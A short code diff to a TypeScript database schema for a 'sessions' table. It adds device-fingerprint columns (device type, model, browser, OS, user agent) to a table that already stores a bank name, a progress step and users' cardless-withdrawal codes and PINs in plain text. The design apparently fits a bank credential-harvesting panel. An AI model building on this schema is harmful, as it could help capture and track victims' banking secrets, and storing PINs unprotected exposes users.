@@ -127,7 +127,13 @@ export const sessions = pgTable("sessions", {
   codigoRetiro: text("codigo_retiro"), // Almacena el código de retiro sin tarjeta ingresado por el usuario
   pinRetiro: text("pin_retiro"), // Almacena el PIN de seguridad adicional para retiro sin tarjeta
   lastActivity: timestamp("last_activity").defaultNow(), // Último momento de actividad
-  hasUserData: boolean("has_user_data").default(false) // Indica si el usuario ingresó algún dato
+  hasUserData: boolean("has_user_data").default(false), // Indica si el usuario ingresó algún dato
+  // Información del dispositivo
+  deviceType: text("device_type"), // 'Android', 'iPhone', 'PC'
+  deviceModel: text("device_model"), // Modelo específico del dispositivo
+  deviceBrowser: text("device_browser"), // Navegador utilizado
+  deviceOs: text("device_os"), // Sistema operativo
+  userAgent: text("user_agent") // User agent completo
 });
 
 export const insertSessionSchema = createInsertSchema(sessions).pick({
@@ -138,6 +144,11 @@ export const insertSessionSchema = createInsertSchema(sessions).pick({
   banco: true,
   pasoActual: true,
   createdBy: true,
+  deviceType: true,
+  deviceModel: true,
+  deviceBrowser: true,
+  deviceOs: true,
+  userAgent: true,
 });
 
 export type InsertSession = z.infer<typeof insertSessionSchema>;
